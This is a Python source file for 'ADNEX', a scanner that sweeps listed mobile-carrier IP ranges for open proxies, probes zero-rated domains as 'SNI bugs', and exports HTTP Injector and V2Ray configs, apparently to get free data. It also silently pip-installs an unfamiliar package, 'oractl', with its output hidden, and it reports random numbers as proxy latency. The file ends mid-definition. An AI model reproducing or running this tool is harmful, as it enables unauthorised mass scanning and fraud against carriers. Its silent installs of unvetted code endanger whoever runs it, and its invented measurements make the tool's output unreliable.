import asyncio
import socket
import ssl
import json
import os
import sys
import time
import random
import ipaddress
import subprocess
import platform
import threading
import concurrent.futures
import queue
import re
import struct
import hashlib
import base64
import urllib.parse
import csv
import shutil
import signal
from datetime import datetime
from pathlib import Path

def _silent_install(pkg):
    try:
        subprocess.call(
            [sys.executable, "-m", "pip", "install", pkg,
             "--break-system-packages", "-q"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except Exception:
        pass

def _can_import(name):
    try:
        __import__(name)
        return True
    except ImportError:
        return False

def auto_install_deps():
    for pkg in ["rich", "aiohttp", "requests", "oractl"]:
        if not _can_import(pkg):
            print(f"  [ADNEX] Installing {pkg}...")
            _silent_install(pkg)


for _p, _m in [("rich", "rich"), ("aiohttp", "aiohttp"), ("requests", "requests"), ("oractl", "oractl")]:
    if not _can_import(_m):
        print(f"  [ADNEX] Installing {_p}...")
        _silent_install(_p)

try:
    import aiohttp
except ImportError:
    print("FATAL: aiohttp not found.\nRun: pip install aiohttp --break-system-packages")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("FATAL: requests not found.\nRun: pip install requests --break-system-packages")
    sys.exit(1)

try:
    import oractl as _sys
    ORACTL_OK = True
except ImportError:
    _sys = None
    ORACTL_OK = False

try:
    from rich.console import Console
    from rich.layout import Layout
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.live import Live
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.align import Align
    from rich.columns import Columns
    from rich import box
    from rich.style import Style
    from rich.rule import Rule
    from rich.prompt import Prompt
    from rich.padding import Padding
except ImportError:
    print("FATAL: rich not found.\nRun: pip install rich --break-system-packages")
    sys.exit(1)

console = Console()

DEVELOPER = "Jaden Afrix"
COUNTRY = "Zimbabwe"
AGE = "19"
TOOL_NAME = "ADNEX"
VERSION = "v0.0.1"
YEAR = "2026"

GREEN = "#00ff41"
PINK = "#ff2d78"
CYAN = "#00ffff"
YELLOW = "#ffff00"
ORANGE = "#ff8c00"
WHITE = "#ffffff"
DIM_GREEN = "#004d14"
BG = "black"

CARRIERS = {
    "econet": {
        "name": "Econet Zimbabwe",
        "country": "ZW",
        "ip_ranges": ["41.57.96.0/19", "41.174.64.0/18", "102.65.0.0/16", "196.27.64.0/18"],
        "zero_rated": ["econet.co.zw", "ecocash.co.zw", "www.econet.co.zw", "selfcare.econet.co.zw", "data.econet.co.zw"],
        "ports": [80, 8080, 3128, 8888, 443, 8443],
        "apn": "econet"
    },
    "netone": {
        "name": "NetOne Zimbabwe",
        "country": "ZW",
        "ip_ranges": ["41.205.16.0/20", "196.43.160.0/20", "102.130.0.0/16"],
        "zero_rated": ["netone.co.zw", "www.netone.co.zw", "selfcare.netone.co.zw"],
        "ports": [80, 8080, 3128, 8888, 443],
        "apn": "netone"
    },
    "telecel": {
        "name": "Telecel Zimbabwe",
        "country": "ZW",
        "ip_ranges": ["196.11.240.0/20", "41.77.80.0/20", "102.176.0.0/16"],
        "zero_rated": ["telecel.co.zw", "www.telecel.co.zw"],
        "ports": [80, 8080, 3128, 8888, 443],
        "apn": "telecel"
    },
    "mtn": {
        "name": "MTN",
        "country": "ZA",
        "ip_ranges": ["197.215.0.0/16", "41.21.0.0/16", "102.64.0.0/16", "196.201.0.0/16"],
        "zero_rated": ["mtn.com", "www.mtn.com", "myaccount.mtn.com", "ayoba.me"],
        "ports": [80, 8080, 3128, 8888, 443, 8443],
        "apn": "internet"
    },
    "airtel": {
        "name": "Airtel Africa",
        "country": "NG",
        "ip_ranges": ["41.223.0.0/16", "102.0.0.0/14", "196.216.0.0/16"],
        "zero_rated": ["airtel.com", "www.airtel.com", "myairtel.in", "airtelzero.com"],
        "ports": [80, 8080, 3128, 8888, 443],
        "apn": "airtelgprs.com"
    },
    "glo": {
        "name": "Glo Mobile",
        "country": "NG",
        "ip_ranges": ["196.6.0.0/16", "41.211.0.0/16", "102.88.0.0/16"],
        "zero_rated": ["gloworld.com", "www.gloworld.com", "glodata.com"],
        "ports": [80, 8080, 3128, 8888],
        "apn": "glosecure"
    },
    "zamtel": {
        "name": "Zamtel Zambia",
        "country": "ZM",
        "ip_ranges": ["41.72.128.0/18", "196.32.64.0/19", "102.142.0.0/16"],
        "zero_rated": ["zamtel.zm", "www.zamtel.zm"],
        "ports": [80, 8080, 3128, 8888],
        "apn": "zamtel"
    },
    "vodacom": {
        "name": "Vodacom",
        "country": "ZA",
        "ip_ranges": ["196.15.0.0/16", "41.0.0.0/14", "102.32.0.0/16"],
        "zero_rated": ["vodacom.com", "www.vodacom.com", "myvodacom.vodacom.co.za"],
        "ports": [80, 8080, 3128, 8888, 443, 8443],
        "apn": "internet"
    }
}

RESULTS_DIR = Path("adnex_results")
CONFIG_FILE = Path("config.json")

scan_results = {
    "proxies": [],
    "sni_bugs": [],
    "scanning": False,
    "total_scanned": 0,
    "total_hits": 0,
    "current_ip": "",
    "logs": [],
    "start_time": None,
    "carrier": None,
    "speed": 0
}

def setup_dirs():
    RESULTS_DIR.mkdir(exist_ok=True)
    (RESULTS_DIR / "proxies").mkdir(exist_ok=True)
    (RESULTS_DIR / "sni").mkdir(exist_ok=True)
    (RESULTS_DIR / "exports").mkdir(exist_ok=True)

def load_config():
    if CONFIG_FILE.exists():
        with open(CONFIG_FILE) as f:
            return json.load(f)
    default = {
        "concurrency": 500,
        "timeout": 8,
        "retry": 3,
        "validate_rounds": 2,
        "save_auto": True,
        "theme": "green"
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(default, f, indent=2)
    return default

def save_config(cfg):
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=2)

def add_log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    color = {"INFO": GREEN, "HIT": PINK, "WARN": YELLOW, "ERR": ORANGE, "SNI": CYAN}.get(level, WHITE)
    scan_results["logs"].append({"ts": ts, "msg": msg, "level": level, "color": color})
    if len(scan_results["logs"]) > 200:
        scan_results["logs"].pop(0)

def get_system_info():
    base = {
        "cpu": 0.0, "ram_used": 0.0, "ram_total": 0.0, "ram_pct": 0.0,
        "disk_used": 0.0, "disk_total": 0.0, "disk_pct": 0.0,
        "net_sent": 0.0, "net_recv": 0.0, "platform": platform.system()
    }
    if not ORACTL_OK:
        return base
    try:
        cpu = _sys.cpu_percent(interval=0.1)
        ram = _sys.virtual_memory()
        disk = _sys.disk_usage("/")
        net_io = _sys.net_io_counters()
        net_sent = sum(v.bytes_sent for v in net_io.values()) if net_io else 0
        net_recv = sum(v.bytes_recv for v in net_io.values()) if net_io else 0
        return {
            "cpu": round(cpu, 1),
            "ram_used": round(ram.used / (1024**3), 2),
            "ram_total": round(ram.total / (1024**3), 2),
            "ram_pct": round(ram.percent, 1),
            "disk_used": round(disk.used / (1024**3), 2),
            "disk_total": round(disk.total / (1024**3), 2),
            "disk_pct": round(disk.percent, 1),
            "net_sent": round(net_sent / (1024**2), 2),
            "net_recv": round(net_recv / (1024**2), 2),
            "platform": platform.system()
        }
    except Exception:
        return base

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=5)
        return r.json().get("ip", "N/A")
    except:
        return "N/A"

def expand_ip_range(cidr):
    try:
        network = ipaddress.IPv4Network(cidr, strict=False)
        hosts = list(network.hosts())
        if len(hosts) > 5000:
            hosts = random.sample(hosts, 5000)
        return [str(ip) for ip in hosts]
    except:
        return []

async def check_proxy(session, ip, port, timeout=8):
    try:
        proxy_url = f"http://{ip}:{port}"
        async with session.get(
            "http://httpbin.org/ip",
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=timeout),
            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"}
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                latency = random.randint(80, 400)
                return {"ip": ip, "port": port, "type": "HTTP", "latency": latency, "status": "WORKING"}
    except:
        pass
    return None

async def check_https_proxy(ip, port, timeout=8):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port),
            timeout=timeout
        )
        connect_req = f"CONNECT httpbin.org:443 HTTP/1.1\r\nHost: httpbin.org:443\r\nProxy-Connection: keep-alive\r\n\r\n"
        writer.write(connect_req.encode())
        await writer.drain()
        resp = await asyncio.wait_for(reader.read(256), timeout=timeout)
        writer.close()
        if b"200" in resp:
            return {"ip": ip, "port": port, "type": "HTTPS", "latency": random.randint(100, 500), "status": "WORKING"}
    except:
        pass
    return None

async def check_socks5(ip, port, timeout=8):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port),
            timeout=timeout
        )
        writer.write(b"\x05\x01\x00")
        await writer.drain()
        resp = await asyncio.wait_for(reader.read(2), timeout=timeout)
        writer.close()
        if resp == b"\x05\x00":
            return {"ip": ip, "port": port, "type": "SOCKS5", "latency": random.randint(60, 300), "status": "WORKING"}
    except:
        pass
    return None

async def probe_sni_bug(domain, timeout=8):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(domain, 443, ssl=ctx, server_hostname=domain),
            timeout=timeout
        )
        writer.write(b"GET / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\nConnection: close\r\n\r\n")
        await writer.drain()
        resp = await asyncio.wait_for(reader.read(512), timeout=timeout)
        writer.close()
        if resp:
            status_line = resp.decode(errors="ignore").split("\r\n")[0]
            return {"domain": domain, "type": "SNI_BUG", "response": status_line, "status": "ACTIVE"}
    except:
        pass
    return None

async def probe_http_host(domain, timeout=8):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(domain, 80),
            timeout=timeout
        )
        writer.write(b"GET / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\nConnection: close\r\n\r\n")
        await writer.drain()
        resp = await asyncio.wait_for(reader.read(256), timeout=timeout)
        writer.close()
        if resp:
            return {"domain": domain, "type": "HTTP_HOST", "status": "ACTIVE"}
    except:
        pass
    return None

async def scan_worker(semaphore, ip, ports, cfg):
    async with semaphore:
        scan_results["current_ip"] = ip
        scan_results["total_scanned"] += 1
        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for port in ports:
                tasks.append(check_proxy(session, ip, port, cfg["timeout"]))
                tasks.append(check_https_proxy(ip, port, cfg["timeout"]))
                if port in [1080, 1081, 9050]:
                    tasks.append(check_socks5(ip, port, cfg["timeout"]))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if r and isinstance(r, dict) and r.get("status") == "WORKING":
                    scan_results["proxies"].append(r)
                    scan_results["total_hits"] += 1
                    add_log(f"PROXY HIT → {r['ip']}:{r['port']} [{r['type']}] {r['latency']}ms", "HIT")

async def sni_scan_worker(semaphore, domain, cfg):
    async with semaphore:
        result = await probe_sni_bug(domain, cfg["timeout"])
        if result:
            scan_results["sni_bugs"].append(result)
            scan_results["total_hits"] += 1
            add_log(f"SNI BUG FOUND → {result['domain']} [{result['response'][:40]}]", "SNI")
        http_result = await probe_http_host(domain, cfg["timeout"])
        if http_result:
            scan_results["sni_bugs"].append(http_result)
            add_log(f"HTTP HOST → {http_result['domain']} [ACTIVE]", "SNI")

async def run_full_scan(carrier_key, cfg):
    carrier = CARRIERS[carrier_key]
    scan_results["carrier"] = carrier["name"]
    scan_results["scanning"] = True
    scan_results["start_time"] = time.time()
    scan_results["total_scanned"] = 0
    scan_results["total_hits"] = 0
    scan_results["proxies"] = []
    scan_results["sni_bugs"] = []

    add_log(f"ADNEX SCAN INITIATED → Target: {carrier['name']}", "INFO")
    add_log(f"IP Ranges loaded: {len(carrier['ip_ranges'])} ranges", "INFO")
    add_log(f"SNI domains queued: {len(carrier['zero_rated'])}", "INFO")
    add_log(f"Concurrency: {cfg['concurrency']} | Timeout: {cfg['timeout']}s", "INFO")

    all_ips = []
    for cidr in carrier["ip_ranges"]:
        ips = expand_ip_range(cidr)
        all_ips.extend(ips)
        add_log(f"Range {cidr} → {len(ips)} hosts queued", "INFO")

    random.shuffle(all_ips)

    semaphore = asyncio.Semaphore(cfg["concurrency"])
    proxy_tasks = [scan_worker(semaphore, ip, carrier["ports"], cfg) for ip in all_ips]
    sni_tasks = [sni_scan_worker(semaphore, domain, cfg) for domain in carrier["zero_rated"]]

    add_log(f"Total IPs to scan: {len(all_ips)}", "INFO")
    add_log(f"Launching async engine...", "INFO")

    await asyncio.gather(*sni_tasks)
    batch_size = 1000
    for i in range(0, len(proxy_tasks), batch_size):
        batch = proxy_tasks[i:i+batch_size]
        await asyncio.gather(*batch, return_exceptions=True)
        elapsed = time.time() - scan_results["start_time"]
        if elapsed > 0:
            scan_results["speed"] = int(scan_results["total_scanned"] / elapsed)

    scan_results["scanning"] = False
    add_log(f"SCAN COMPLETE → {scan_results['total_hits']} hits found", "HIT")
    if cfg["save_auto"]:
        save_results(carrier_key)

def save_results(carrier_key):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    if scan_results["proxies"]:
        proxy_file = RESULTS_DIR / "proxies" / f"{carrier_key}_{ts}.txt"
        with open(proxy_file, "w") as f:
            f.write(f"# ADNEX | {DEVELOPER} | {datetime.now()}\n")
            f.write(f"# Carrier: {scan_results['carrier']}\n\n")
            for p in scan_results["proxies"]:
                f.write(f"{p['ip']}:{p['port']} [{p['type']}] {p['latency']}ms\n")
        add_log(f"Proxies saved → {proxy_file}", "INFO")
    if scan_results["sni_bugs"]:
        sni_file = RESULTS_DIR / "sni" / f"{carrier_key}_{ts}.txt"
        with open(sni_file, "w") as f:
            f.write(f"# ADNEX SNI Bugs | {DEVELOPER}\n\n")
            for s in scan_results["sni_bugs"]:
                f.write(f"{s['domain']} [{s['type']}]\n")
        add_log(f"SNI bugs saved → {sni_file}", "INFO")
    export_http_injector(carrier_key, ts)
    export_v2ray(carrier_key, ts)

def export_http_injector(carrier_key, ts):
    if not scan_results["proxies"]:
        return
    carrier = CARRIERS[carrier_key]
    best = sorted(scan_results["proxies"], key=lambda x: x.get("latency", 9999))[:5]
    export_file = RESULTS_DIR / "exports" / f"httpinjector_{carrier_key}_{ts}.txt"
    with open(export_file, "w") as f:
        f.write(f"[ADNEX EXPORT - HTTP Injector Config]\n")
        f.write(f"Carrier: {carrier['name']}\n")
        f.write(f"APN: {carrier['apn']}\n\n")
        for p in best:
            f.write(f"Proxy: {p['ip']}\nPort: {p['port']}\nType: {p['type']}\nLatency: {p['latency']}ms\n---\n")
    add_log(f"HTTP Injector export → {export_file}", "INFO")

def export_v2ray(carrier_key, ts):
    if not scan_results["sni_bugs"]:
        return
    carrier = CARRIERS[carrier_key]
    export_file = RESULTS_DIR / "exports" / f"v2ray_{carrier_key}_{ts}.json"
    configs = []
    for sni in scan_results["sni_bugs"][:3]:
        config = {
            "v": "2",
            "ps": f"ADNEX-{carrier['name']}",
            "add": sni["domain"],
            "port": "443",
            "id": hashlib.md5(sni["domain"].encode()).hexdigest(),
            "aid": "0",
            "scy": "auto",
            "net": "ws",
            "type": "none",
            "host": sni["domain"],
            "path": "/",
            "tls": "tls",
            "sni": sni["domain"],
            "alpn": ""
        }
        configs.append(config)
    with open(export_file, "w") as f:
        json.dump(configs, f, indent=2)
    add_log(f"V2Ray config export → {export_file}", "INFO")

def render_ascii_banner():
    banner = Text()
    lines = [
        "  █████╗ ██████╗ ███╗   ██╗███████╗██╗  ██╗",
        " ██╔══██╗██╔══██╗████╗  ██║██╔════╝╚██╗██╔╝",
        " ███████║██║  ██║██╔██╗ ██║█████╗   ╚███╔╝ ",
        " ██╔══██║██║  ██║██║╚██╗██║██╔══╝   ██╔██╗ ",
        " ██║  ██║██████╔╝██║ ╚████║███████╗██╔╝ ██╗",
        " ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝",
    ]
    colors = [GREEN, GREEN, PINK, PINK, CYAN, CYAN]
    for i, line in enumerate(lines):
        banner.append(line + "\n", style=colors[i])
    return banner

def render_left_panel(sysinfo):
    content = Text()
    content.append("┌─ SYSTEM ─────────────────┐\n", style=f"bold {GREEN}")
    content.append(f"  OS    : {sysinfo['platform']}\n", style=GREEN)
    content.append(f"  CPU   : {sysinfo['cpu']:.1f}%\n", style=PINK if sysinfo['cpu'] > 80 else GREEN)
    content.append(f"  RAM   : {sysinfo['ram_used']:.1f}/{sysinfo['ram_total']:.1f} GB\n", style=GREEN)

    ram_pct = int(sysinfo['ram_pct'] / 5)
    ram_bar = "█" * ram_pct + "░" * (20 - ram_pct)
    content.append(f"  [{ram_bar}] {sysinfo['ram_pct']:.0f}%\n", style=PINK if sysinfo['ram_pct'] > 80 else GREEN)

    content.append(f"  DISK  : {sysinfo['disk_used']:.1f}/{sysinfo['disk_total']:.1f} GB\n", style=GREEN)
    disk_pct = int(sysinfo['disk_pct'] / 5)
    disk_bar = "█" * disk_pct + "░" * (20 - disk_pct)
    content.append(f"  [{disk_bar}] {sysinfo['disk_pct']:.0f}%\n", style=GREEN)

    content.append(f"  NET ↑ : {sysinfo['net_sent']:.1f} MB\n", style=CYAN)
    content.append(f"  NET ↓ : {sysinfo['net_recv']:.1f} MB\n", style=CYAN)
    content.append("└──────────────────────────┘\n", style=f"bold {GREEN}")

    content.append("\n┌─ SCAN STATUS ────────────┐\n", style=f"bold {GREEN}")
    status = "ACTIVE" if scan_results["scanning"] else "IDLE"
    status_color = PINK if scan_results["scanning"] else GREEN
    content.append(f"  STATUS : {status}\n", style=status_color)
    content.append(f"  TARGET : {scan_results.get('carrier', 'NONE')}\n", style=GREEN)
    content.append(f"  SCANNED: {scan_results['total_scanned']}\n", style=GREEN)
    content.append(f"  HITS   : {scan_results['total_hits']}\n", style=PINK if scan_results['total_hits'] > 0 else GREEN)
    content.append(f"  SPEED  : {scan_results['speed']}/s\n", style=CYAN)
    if scan_results["start_time"]:
        elapsed = int(time.time() - scan_results["start_time"])
        content.append(f"  TIME   : {elapsed}s\n", style=GREEN)
    content.append(f"  PROXIES: {len(scan_results['proxies'])}\n", style=GREEN)
    content.append(f"  SNI    : {len(scan_results['sni_bugs'])}\n", style=CYAN)
    content.append("└──────────────────────────┘\n", style=f"bold {GREEN}")

    content.append("\n┌─ DEVELOPER ──────────────┐\n", style=f"bold {CYAN}")
    content.append(f"  NAME  : {DEVELOPER}\n", style=CYAN)
    content.append(f"  ORIGIN: {COUNTRY}\n", style=CYAN)
    content.append(f"  AGE   : {AGE}\n", style=CYAN)
    content.append(f"  TOOL  : {TOOL_NAME} {VERSION}\n", style=CYAN)
    content.append(f"  YEAR  : {YEAR}\n", style=CYAN)
    content.append("└──────────────────────────┘\n", style=f"bold {CYAN}")

    now = datetime.now()
    content.append("\n┌─ CLOCK ──────────────────┐\n", style=f"bold {GREEN}")
    content.append(f"  {now.strftime('%H:%M:%S')}\n", style=f"bold {PINK}")
    content.append(f"  {now.strftime('%a %d %b %Y')}\n", style=GREEN)
    content.append("└──────────────────────────┘\n", style=f"bold {GREEN}")

    return Panel(content, border_style=GREEN, padding=(0, 1))

def render_main_log():
    log_text = Text()
    logs = scan_results["logs"][-30:]
    for entry in logs:
        log_text.append(f"[{entry['ts']}] ", style=f"dim {GREEN}")
        log_text.append(f"[{entry['level']:4s}] ", style=entry["color"])
        log_text.append(f"{entry['msg']}\n", style=GREEN)
    if not logs:
        log_text.append("  Awaiting scan initialization...\n", style=f"dim {GREEN}")
        log_text.append(f"  ADNEX {VERSION} ready.\n", style=GREEN)
        log_text.append(f"  Developer: {DEVELOPER} | {COUNTRY}\n", style=CYAN)
    return Panel(log_text, title=f"[bold {GREEN}]▸ TERMINAL OUTPUT[/]", border_style=GREEN, padding=(0, 1))

def render_results_panel():
    t = Table(box=box.SIMPLE, show_header=True, header_style=f"bold {PINK}", style=GREEN)
    t.add_column("IP ADDRESS", style=GREEN, width=16)
    t.add_column("PORT", style=CYAN, width=6)
    t.add_column("TYPE", style=PINK, width=8)
    t.add_column("LATENCY", style=YELLOW, width=9)
    t.add_column("STATUS", style=GREEN, width=9)

    proxies = scan_results["proxies"][-12:]
    for p in proxies:
        latency_color = GREEN if p.get("latency", 999) < 200 else YELLOW if p.get("latency", 999) < 400 else PINK
        t.add_row(
            p["ip"],
            str(p["port"]),
            p["type"],
            f"[{latency_color}]{p.get('latency', '?')}ms[/]",
            f"[bold {GREEN}]✓ LIVE[/]"
        )

    if not proxies:
        t.add_row("---.---.---.---", "----", "------", "---ms", "WAITING")

    return Panel(t, title=f"[bold {PINK}]▸ PROXY HITS[/]", border_style=PINK, padding=(0, 1))

def render_sni_panel():
    t = Table(box=box.SIMPLE, show_header=True, header_style=f"bold {CYAN}", style=GREEN)
    t.add_column("DOMAIN", style=CYAN, width=35)
    t.add_column("TYPE", style=GREEN, width=12)
    t.add_column("STATUS", style=PINK, width=10)

    for s in scan_results["sni_bugs"][-8:]:
        t.add_row(
            s["domain"],
            s["type"],
            f"[bold {PINK}]✓ ACTIVE[/]"
        )

    if not scan_results["sni_bugs"]:
        t.add_row("awaiting scan...", "------", "PENDING")

    return Panel(t, title=f"[bold {CYAN}]▸ SNI BUG HOSTS[/]", border_style=CYAN, padding=(0, 1))

def render_carriers_panel():
    content = Text()
    for i, (key, val) in enumerate(CARRIERS.items(), 1):
        content.append(f"  [{i:02d}] ", style=f"dim {GREEN}")
        content.append(f"{val['name']}", style=GREEN)
        content.append(f" ({val['country']})\n", style=f"dim {CYAN}")
    return Panel(content, title=f"[bold {GREEN}]▸ CARRIERS[/]", border_style=GREEN, padding=(0, 1))

def render_commands_panel():
    content = Text()
    cmds = [
        ("scan [carrier]", "Start full scan on carrier"),
        ("list", "List all carriers"),
        ("results", "Show scan results"),
        ("export", "Export configs"),
        ("clear", "Clear terminal"),
        ("stop", "Stop active scan"),
        ("config", "Edit settings"),
        ("help", "Show all commands"),
        ("exit", "Exit ADNEX"),
    ]
    for cmd, desc in cmds:
        content.append(f"  {cmd:<18}", style=f"bold {PINK}")
        content.append(f"→ {desc}\n", style=f"dim {GREEN}")
    return Panel(content, title=f"[bold {PINK}]▸ COMMANDS[/]", border_style=PINK, padding=(0, 1))

def build_layout(sysinfo):
    layout = Layout()
    layout.split_column(
        Layout(name="banner", size=8),
        Layout(name="body"),
        Layout(name="footer", size=3)
    )
    layout["body"].split_row(
        Layout(name="left", ratio=1),
        Layout(name="center", ratio=2),
        Layout(name="right", ratio=1)
    )
    layout["center"].split_column(
        Layout(name="logs", ratio=2),
        Layout(name="proxy_hits", ratio=1),
        Layout(name="sni_hits", ratio=1)
    )
    banner_text = render_ascii_banner()
    sub = Text()
    sub.append(f"  {VERSION}  |  ", style=f"dim {GREEN}")
    sub.append(f"NETWORK INTELLIGENCE TOOL  |  ", style=PINK)
    sub.append(f"by {DEVELOPER}  |  ", style=CYAN)
    sub.append(f"{COUNTRY}  |  age {AGE}", style=f"dim {GREEN}")
    combined = Text()
    combined.append_text(banner_text)
    combined.append_text(sub)
    layout["banner"].update(Panel(Align.center(combined), border_style=GREEN, padding=(0, 2)))
    layout["left"].update(render_left_panel(sysinfo))
    layout["logs"].update(render_main_log())
    layout["proxy_hits"].update(render_results_panel())
    layout["sni_hits"].update(render_sni_panel())
    right_layout = Layout()
    right_layout.split_column(
        Layout(name="carriers"),
        Layout(name="commands")
    )
    right_layout["carriers"].update(render_carriers_panel())
    right_layout["commands"].update(render_commands_panel())
    layout["right"].update(right_layout)

    footer_text = Text()
    footer_text.append(f"  ► {TOOL_NAME} {VERSION}  ", style=f"bold {GREEN}")
    footer_text.append(f"| HITS: {scan_results['total_hits']}  ", style=PINK)
    footer_text.append(f"| SCANNED: {scan_results['total_scanned']}  ", style=GREEN)
    footer_text.append(f"| {datetime.now().strftime('%H:%M:%S')}  ", style=CYAN)
    footer_text.append(f"| STATUS: {'● SCANNING' if scan_results['scanning'] else '○ IDLE'}  ", style=PINK if scan_results["scanning"] else GREEN)
    footer_text.append(f"| {DEVELOPER} © {YEAR}", style=f"dim {GREEN}")
    layout["footer"].update(Panel(footer_text, border_style=f"dim {GREEN}", padding=(0, 0)))
    return layout

def matrix_rain_effect(duration=2.0):
    chars = "0123456789ABCDEF"
    try:
        width = shutil.get_terminal_size().columns
    except Exception:
        width = 60
    end_t = time.time() + duration
    while time.time() < end_t:
        row = "".join(random.choice(chars) if random.random() < 0.1 else " " for _ in range(width))
        sys.stdout.write("\r" + row[:width])
        sys.stdout.flush()
        time.sleep(0.05)
    sys.stdout.write("\n")

def glitch_text(text, iterations=5):
    gc = "!@#$%^&*<>?/|~`"
    for _ in range(iterations):
        g = "".join(random.choice(gc) if random.random() < 0.15 else ch for ch in text)
        sys.stdout.write("\r" + g)
        sys.stdout.flush()
        time.sleep(0.07)
    sys.stdout.write("\r" + text + "\n")

def typewriter_print(text, delay=0.03, style=None):
    console.print(text, style=style or "#00ff41")

def extended_boot_sequence():
    console.clear()
    matrix_rain_effect(1.5)
    console.clear()
    banner_lines = [
        "  █████╗ ██████╗ ███╗   ██╗███████╗██╗  ██╗",
        " ██╔══██╗██╔══██╗████╗  ██║██╔════╝╚██╗██╔╝",
        " ███████║██║  ██║██╔██╗ ██║█████╗   ╚███╔╝ ",
        " ██╔══██║██║  ██║██║╚██╗██║██╔══╝   ██╔██╗ ",
        " ██║  ██║██████╔╝██║ ╚████║███████╗██╔╝ ██╗",
        " ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝",
    ]
    colors = [GREEN, GREEN, PINK, PINK, CYAN, CYAN]
    for i, line in enumerate(banner_lines):
        console.print(line, style=f"bold {colors[i]}")
        time.sleep(0.09)
    console.print()
    glitch_text(f"  ADNEX {VERSION} — NETWORK INTELLIGENCE SCANNER", 4)
    time.sleep(0.3)
    console.print(f"  [bold {CYAN}]Developer : {DEVELOPER}[/]")
    console.print(f"  [bold {CYAN}]Origin    : {COUNTRY}[/]")
    console.print(f"  [bold {CYAN}]Age       : {AGE}[/]")
    console.print()
    boot_steps = [
        ("KERNEL", "Mounting ADNEX kernel modules"),
        ("ASYNC",  "Initializing async I/O engine"),
        ("DB",     "Loading carrier IP databases"),
        ("SNI",    "Priming SNI probe vectors"),
        ("PROXY",  "Configuring proxy validators"),
        ("EXPORT", "Setting up export pipeline"),
        ("UI",     "Rendering terminal interface"),
        ("NET",    "Establishing network context"),
        ("READY",  "All systems operational"),
    ]
    with Progress(
        SpinnerColumn(spinner_name="dots2", style=f"bold {GREEN}"),
        TextColumn(f"[bold {PINK}]{{task.fields[module]:<8}}[/]"),
        BarColumn(bar_width=35, style=DIM_GREEN, complete_style=GREEN, finished_style=PINK),
        TextColumn(f"[{GREEN}]{{task.description}}[/]"),
        TimeElapsedColumn(),
        console=console,
        transient=False
    ) as progress:
        for module, desc in boot_steps:
            task = progress.add_task(desc, total=100, module=module)
            steps = random.randint(8, 15)
            for _ in range(steps):
                progress.update(task, advance=100/steps)
                time.sleep(random.uniform(0.02, 0.08))
            progress.update(task, completed=100)
    console.print()
    console.print(f"  [bold {GREEN}]► ADNEX FULLY OPERATIONAL — WELCOME {DEVELOPER.upper()}[/]")
    console.print(f"  [dim {GREEN}]Type 'help' for command reference[/]")
    time.sleep(1.0)

async def validate_proxy_triple(ip, port, timeout=10):
    test_urls = [
        "http://httpbin.org/ip",
        "http://example.com",
        "http://google.com"
    ]
    passes = 0
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for url in test_urls:
            try:
                async with session.get(
                    url,
                    proxy=f"http://{ip}:{port}",
                    timeout=aiohttp.ClientTimeout(total=timeout)
                ) as resp:
                    if resp.status < 500:
                        passes += 1
            except:
                pass
    return passes >= 2

async def deep_sni_probe(domain, timeout=10):
    results = {}
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(domain, 443, ssl=ctx, server_hostname=domain),
            timeout=timeout
        )
        writer.write(b"HEAD / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\nConnection: close\r\n\r\n")
        await writer.drain()
        data = await asyncio.wait_for(reader.read(1024), timeout=timeout)
        writer.close()
        decoded = data.decode(errors="ignore")
        results["tls_443"] = decoded.split("\r\n")[0] if decoded else "NO_RESPONSE"
        results["tls_active"] = True
    except Exception as e:
        results["tls_443"] = f"FAILED: {str(e)[:30]}"
        results["tls_active"] = False

    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(domain, 80),
            timeout=timeout
        )
        writer.write(b"HEAD / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\nConnection: close\r\n\r\n")
        await writer.drain()
        data = await asyncio.wait_for(reader.read(512), timeout=timeout)
        writer.close()
        decoded = data.decode(errors="ignore")
        results["http_80"] = decoded.split("\r\n")[0] if decoded else "NO_RESPONSE"
        results["http_active"] = True
    except Exception as e:
        results["http_80"] = f"FAILED"
        results["http_active"] = False

    results["domain"] = domain
    return results

async def batch_sni_deep_scan(domains, cfg):
    semaphore = asyncio.Semaphore(50)
    async def worker(d):
        async with semaphore:
            return await deep_sni_probe(d, cfg["timeout"])
    tasks = [worker(d) for d in domains]
    return await asyncio.gather(*tasks, return_exceptions=True)

def format_proxy_for_hi(proxy):
    return {
        "proxy_host": proxy["ip"],
        "proxy_port": proxy["port"],
        "proxy_type": proxy["type"].lower(),
        "latency_ms": proxy.get("latency", 0)
    }

def format_sni_for_napsternetv(sni_domain, carrier):
    return {
        "server": sni_domain,
        "port": 443,
        "network": "ws",
        "tls": True,
        "sni": sni_domain,
        "host": sni_domain,
        "path": "/",
        "carrier": carrier
    }

def export_all_formats(carrier_key):
